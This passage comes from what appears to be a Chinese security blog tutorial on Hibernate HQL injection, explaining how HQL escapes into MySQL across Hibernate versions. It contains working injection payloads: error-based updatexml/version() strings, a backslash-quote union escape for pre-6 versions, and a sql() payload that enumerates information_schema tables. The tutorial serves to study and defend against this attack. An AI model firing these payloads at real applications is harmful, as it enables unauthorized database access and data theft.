</div><p><img loading="lazy" src="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312145841461.png" alt="image-20250312145841461" srcset="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312145841461.png?size=small, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312145841461.png?size=medium 1.5x, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312145841461.png?size=large 2x" data-title="image-20250312145841461" style="--width: 1402px;--aspect-ratio: 1402 / 820;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>映射后表名、列名大小写敏感，也会报错</p>
<h3 id="通配符限制" class="heading-element"><span>通配符*限制</span>
  <a href="#%e9%80%9a%e9%85%8d%e7%ac%a6%e9%99%90%e5%88%b6" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p><strong>不支持<code>*</code>查询</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?name=test&#39; and (select * from User where id=1)=&#39;1</span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312150055280.png" alt="image-20250312150055280" srcset="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312150055280.png?size=small, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312150055280.png?size=medium 1.5x, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312150055280.png?size=large 2x" data-title="image-20250312150055280" style="--width: 1408px;--aspect-ratio: 1408 / 786;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<h2 id="hql注入进阶" class="heading-element"><span>HQL注入进阶</span>
  <a href="#hql%e6%b3%a8%e5%85%a5%e8%bf%9b%e9%98%b6" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>因为HQL框架不管你HQL语句是什么，最终还是要转为SQL语句在数据库中进行查询的。</p>
<p>下面主要以MYSQL数据库进行研究，当然不同版本HQL逃逸方式是不同的。</p>
<h3 id="数据库函数" class="heading-element"><span>数据库函数</span>
  <a href="#%e6%95%b0%e6%8d%ae%e5%ba%93%e5%87%bd%e6%95%b0" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>Hibernate会在 SELECT 和 WHERE 语句中隐藏一些不可识别的列名，对函数也一样。</p>
<p>1、在 5.6.15之前，WHERE子句中是可以使用用户自定义函数的，这就说明数据库本身的函数也是可以使用的</p>
<p>调用数据库函数的标准过程是 <a href="http://docs.jboss.org/hibernate/orm/3.5/reference/en/html/portability.html#portability-functions"target="_blank" rel="external nofollow noopener noreferrer">事先注册函数映射（HQL-&gt;SQL）</a>（Java代码），但攻击者不需要关心兼容性。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">updatexml()
</span></span><span class="line"><span class="cl">version()
</span></span><span class="line"><span class="cl">user()
</span></span><span class="line"><span class="cl">database()</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">name</span><span class="o">=</span><span class="n">test</span><span class="s1">&#39; and updatexml(1,concat(&#39;</span><span class="o">~</span><span class="s1">&#39;,version(),&#39;</span><span class="o">~</span><span class="s1">&#39;),1)=&#39;</span><span class="mi">1</span></span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312155638206.png" alt="image-20250312155638206" srcset="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312155638206.png?size=small, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312155638206.png?size=medium 1.5x, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312155638206.png?size=large 2x" data-title="image-20250312155638206" style="--width: 2034px;--aspect-ratio: 2034 / 1306;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>这块报错把代码中的 catch部分代码注释后才会显示。</p>
<h3 id="单引号转义" class="heading-element"><span>单引号转义</span>
  <a href="#%e5%8d%95%e5%bc%95%e5%8f%b7%e8%bd%ac%e4%b9%89" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p><strong>低于5.x版本逃逸</strong></p>
<p>在5.6.15版本之前，存在着对HQL与SQL单引号转义的差异导致的逃逸问题</p>
<p>在HQL语言，字符串和常规SQL语句一样都是使用单引号包裹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from User where name = &#39;test&#39;</span></span></code></pre></td></tr></table>
</div>
</div><p>引擎是不会对字符串里面的内容进行解析的，当在字符串中加入一个转义字符</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from Tables where name = &#39;test\&#39;</span></span></code></pre></td></tr></table>
</div>
</div><p>HQL引擎是不识别转义字符<code>\</code>的，它会将<code>test\</code>作为一个字符串整体，原封不动的转为mysql语句</p>
<p><img loading="lazy" src="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312161737357.png" alt="image-20250312161737357" srcset="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312161737357.png?size=small, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312161737357.png?size=medium 1.5x, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312161737357.png?size=large 2x" data-title="image-20250312161737357" style="--width: 2500px;--aspect-ratio: 2500 / 1026;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>此处就导致了一个差异，mysql是识别转译字符的，所以爆了语法错误</p>
<p>然后利用这个差异，构造一个HQL以为是字符串，但转为mysql变成语句的POC即可</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">test\&#39;&#39;and 1=2 union select 1,user(),version()#</span></span></code></pre></td></tr></table>
</div>
</div><p>拼接HQL语句，此时HQL引擎会将其视为一整个字符串，所以引擎不去解析</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from User where name = &#39;test\&#39;&#39;and 1=2 union select 1,user(),version()#&#39;</span></span></code></pre></td></tr></table>
</div>
</div><p>最后转为SQL语句，逃逸成功执行union语句</p>
<p><img loading="lazy" src="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312161953637.png" alt="image-20250312161953637" srcset="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312161953637.png?size=small, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312161953637.png?size=medium 1.5x, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312161953637.png?size=large 2x" data-title="image-20250312161953637" style="--width: 1424px;--aspect-ratio: 1424 / 732;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>从6.0.1.Final版本开始，测试发现转义符<code>\</code>失效</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39;mysql\a&#39;  =&gt;  &#39;mysql\\a&#39;
</span></span><span class="line"><span class="cl">&#39;mysql\&#39;   =&gt;  &#39;mysql\\&#39;
</span></span><span class="line"><span class="cl">&#39;mysql\&#39;&#39;  =&gt;  &#39;mysql&#39;&#39;&#39;
</span></span><span class="line"><span class="cl">&#39;mysql\&#39;&#39;&#39; =&gt;  &#39;mysql&#39;&#39;&#39;&#39;&#39;</span></span></code></pre></td></tr></table>
</div>
</div><p>从6.1.7.Final版本开始又有了变化</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39;mysql\a&#39;  =&gt;  &#39;mysql\\a&#39;
</span></span><span class="line"><span class="cl">&#39;mysql\&#39;   =&gt;  &#39;mysql\\&#39;
</span></span><span class="line"><span class="cl">&#39;mysql\&#39;&#39;  =&gt;  &#39;mysql\\&#39;&#39;
</span></span><span class="line"><span class="cl">&#39;mysql\&#39;&#39;&#39; =&gt;  &#39;mysql\\&#39;&#39;&#39;
</span></span><span class="line"><span class="cl">&#39;mysql\\&#39;  =&gt;  &#39;mysql\\\\&#39;</span></span></code></pre></td></tr></table>
</div>
</div><p>所以无法使用此方式逃逸了</p>
<h3 id="sql" class="heading-element"><span>sql()</span>
  <a href="#sql" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p><em>这部分我没进行验证，没有记录</em></p>
<p><strong>高于6.x 版本逃逸</strong></p>
<p>在6.x版本中发现新增了一个<code>sql()</code>函数，在5.x版本是不支持的</p>
<p><a href="https://docs.jboss.org/hibernate/orm/6.0/userguide/html_single/Hibernate_User_Guide.html#hql-function-sql"target="_blank" rel="external nofollow noopener noreferrer">https://docs.jboss.org/hibernate/orm/6.0/userguide/html_single/Hibernate_User_Guide.html#hql-function-sql</a></p>
<p><img loading="lazy" src="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/20240826193507-3ea7f418-639f-1.png" alt="img" srcset="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/20240826193507-3ea7f418-639f-1.png?size=small, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/20240826193507-3ea7f418-639f-1.png?size=medium 1.5x, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/20240826193507-3ea7f418-639f-1.png?size=large 2x" data-title="img" style="--width: 1976px;--aspect-ratio: 1976 / 680;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>意思就是可以执行SQL语句，主要是两种方式</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sql(&#39;select 1,2,3&#39;)
</span></span><span class="line"><span class="cl">sql(&#39;select 1,2,?&#39;,&#39;3&#39;)</span></span></code></pre></td></tr></table>
</div>
</div><p>1、第一种是将函数里面的字符串直接拼接SQL语句中，然后去执行</p>
<p><img loading="lazy" src="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/20240826193519-45fd60f4-639f-1.png" alt="img" srcset="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/20240826193519-45fd60f4-639f-1.png?size=small, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/20240826193519-45fd60f4-639f-1.png?size=medium 1.5x, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/20240826193519-45fd60f4-639f-1.png?size=large 2x" data-title="img" style="--width: 3024px;--aspect-ratio: 3024 / 510;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p><img loading="lazy" src="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/20240826193527-4a77f6c6-639f-1.png" alt="img" srcset="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/20240826193527-4a77f6c6-639f-1.png?size=small, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/20240826193527-4a77f6c6-639f-1.png?size=medium 1.5x, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/20240826193527-4a77f6c6-639f-1.png?size=large 2x" data-title="img" style="--width: 694px;--aspect-ratio: 694 / 450;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>2、第二种就是将后面参数预编译替换占位符<code>?</code>，然后再拼接到SQL语句中执行</p>
<p><img loading="lazy" src="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/20240826193538-5128e3fe-639f-1.png" alt="img" srcset="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/20240826193538-5128e3fe-639f-1.png?size=small, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/20240826193538-5128e3fe-639f-1.png?size=medium 1.5x, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/20240826193538-5128e3fe-639f-1.png?size=large 2x" data-title="img" style="--width: 3024px;--aspect-ratio: 3024 / 476;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p><img loading="lazy" src="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/20240826193545-555e180e-639f-1.png" alt="img" srcset="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/20240826193545-555e180e-639f-1.png?size=small, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/20240826193545-555e180e-639f-1.png?size=medium 1.5x, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/20240826193545-555e180e-639f-1.png?size=large 2x" data-title="img" style="--width: 764px;--aspect-ratio: 764 / 438;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>既然是以字符串拼接的方式进行解析，那就能构造出poc进行利用</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?name=mysql&#39; and sql(&#39;1=2 union select table_name,table_schema from information_schema.tables#&#39;)=&#39;1</span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/20240826193559-5df24882-639f-1.png" alt="img" srcset="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/20240826193559-5df24882-639f-1.png?size=small, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/20240826193559-5df24882-639f-1.png?size=medium 1.5x, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/20240826193559-5df24882-639f-1.png?size=large 2x" data-title="img" style="--width: 3024px;--aspect-ratio: 3024 / 990;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>下面是最终解析完的sql语句，成功逃逸</p>
<p><img loading="lazy" src="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/20240826193609-63a210e6-639f-1.png" alt="img" srcset="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/20240826193609-63a210e6-639f-1.png?size=small, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/20240826193609-63a210e6-639f-1.png?size=medium 1.5x, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/20240826193609-63a210e6-639f-1.png?size=large 2x" data-title="img" style="--width: 1298px;--aspect-ratio: 1298 / 704;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<h3 id="function" class="heading-element"><span>function()</span>
  <a href="#function" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>Hibernate框架同时支持JPQL语言和HQL语言的，可利用JPQL语言的<code>function()</code>函数进行注入</p>
<p><a href="https://docs.jboss.org/hibernate/orm/5.6/userguide/html_single/Hibernate_User_Guide.html#hql-user-defined-functions-where-clause"target="_blank" rel="external nofollow noopener noreferrer">https://docs.jboss.org/hibernate/orm/5.6/userguide/html_single/Hibernate_User_Guide.html#hql-user-defined-functions-where-clause</a></p>
<p><img loading="lazy" src="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/20240826193627-6e366430-639f-1.png" alt="img" srcset="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/20240826193627-6e366430-639f-1.png?size=small, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/20240826193627-6e366430-639f-1.png?size=medium 1.5x, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/20240826193627-6e366430-639f-1.png?size=large 2x" data-title="img" style="--width: 1998px;--aspect-ratio: 1998 / 908;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p><code>function()</code>函数是用来调用自定义函数或数据库自带函数的，和某些动态函数调用差不多吧</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">function</span><span class="p">(</span><span class="s1">&#39;version&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="k">version</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">function</span><span class="p">(</span><span class="s1">&#39;updatexml&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">function</span><span class="p">(</span><span class="s1">&#39;aaaa&#39;&#39;bbbb&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">aaaa</span><span class="s1">&#39;&#39;</span><span class="n">bbbb</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="mi">5</span><span class="p">.</span><span class="n">x版本</span><span class="w">
